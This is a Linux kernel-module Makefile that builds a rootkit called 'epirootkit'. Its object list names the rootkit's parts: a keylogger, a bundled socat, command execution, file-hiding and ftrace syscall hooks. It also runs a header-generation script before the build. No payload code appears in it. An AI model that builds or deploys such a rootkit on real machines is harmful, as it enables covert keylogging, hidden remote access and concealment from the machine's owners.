KERNELDIR := /lib/modules/$(shell uname -r)/build
PWD       := $(shell pwd)

ccflags-y += \
    -I$(PWD) \
    -I$(PWD)/interceptor/core \
    -I$(PWD)/interceptor/hooks/alterate \
    -I$(PWD)/interceptor/hooks/forbid \
    -I$(PWD)/interceptor/hooks/hide

obj-m := epirootkit.o

epirootkit-objs := \
    main.o            \
    network.o         \
    exec_cmd.o        \
    socat.o           \
    file_ops.o        \
    epikeylog.o       \
    hider.o           \
    rootkit_command.o \
    fs.o              \
    crypto.o          \
    interceptor/core/array.o    \
    interceptor/core/menu.o     \
    interceptor/core/ftrace.o   \
    interceptor/hooks/alterate/alterate.o \
    interceptor/hooks/alterate/list.o     \
    interceptor/hooks/forbid/forbid.o     \
    interceptor/hooks/forbid/list.o       \
    interceptor/hooks/hide/hide.o         \
    interceptor/hooks/hide/list.o

.PHONY: all modules clean

all: modules

modules:
	@./generate_socat_h.sh
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean
